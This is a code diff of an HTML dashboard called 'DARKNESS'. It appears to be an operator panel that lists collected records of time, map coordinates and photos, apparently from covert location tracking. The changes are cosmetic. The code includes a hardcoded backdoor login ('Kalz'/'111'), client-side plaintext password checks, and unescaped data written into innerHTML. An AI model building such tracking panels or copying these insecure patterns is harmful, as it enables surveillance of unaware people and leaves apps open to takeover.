@@ -28,12 +28,11 @@
     </style>
 </head>
 <body>
-
     <div id="login-screen">
         <div style="width:100%; max-width:300px; text-align:center;">
             <h1 style="color:var(--red); letter-spacing:10px;">DARKNESS</h1>
             <input type="text" id="uIn" placeholder="USER ID"><input type="password" id="pIn" placeholder="PASS KEY">
-            <button style="background:var(--red); color:#fff; border:none; padding:15px; width:100%; font-weight:bold; margin-top:10px; width:100%;" onclick="login()">AUTHORIZE</button>
+            <button style="background:var(--red); color:#fff; border:none; padding:15px; width:100%; font-weight:bold; margin-top:10px; width:100%; cursor:pointer;" onclick="login()">AUTHORIZE</button>
         </div>
     </div>
 
@@ -53,10 +52,8 @@
             <table><thead><tr><th>USER</th><th>ROLE</th><th>ACT</th></tr></thead><tbody id="l-user"></tbody></table>
         </div>
         <div id="t-supp" class="section">
-            <div style="border-left: 3px solid var(--red); padding:15px; background:var(--card);">
-                <p>LEAD: KALZ</p><p>DATABASE: CONNECTED</p>
-            </div>
-            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">LOGOUT</button>
+            <div style="border-left: 3px solid var(--red); padding:15px; background:var(--card);"><p>LEAD: KALZ</p><p>DATABASE: CONNECTED</p></div>
+            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">LOGOUT SESSION</button>
         </div>
     </div>
 
@@ -85,7 +82,7 @@
         if(u === "Kalz" && p === "111") { ses = {u: "Kalz", r: "developer"}; enterMarkas(); return; }
         db.ref('users/' + u).once('value', s => {
             const d = s.val();
-            if(d && d.p === p) { ses = {u, r: d.r}; enterMarkas(); } else alert("DENIED");
+            if(d && d.p === p) { ses = {u, r: d.r}; enterMarkas(); } else alert("ACCESS DENIED");
         });
     }
 
@@ -108,7 +105,8 @@
             const d = s.val();
             for(let id in d) {
                 const x = d[id];
-                b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('https://www.google.com/maps?q=${x.lat},${x.lon}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
+                const maps = `https://www.google.com/maps?q=${x.lat},${x.lon}`;
+                b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('${maps}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
             }
         });
     }
@@ -130,3 +128,4 @@
 </script>
 </body>
 </html>
+.
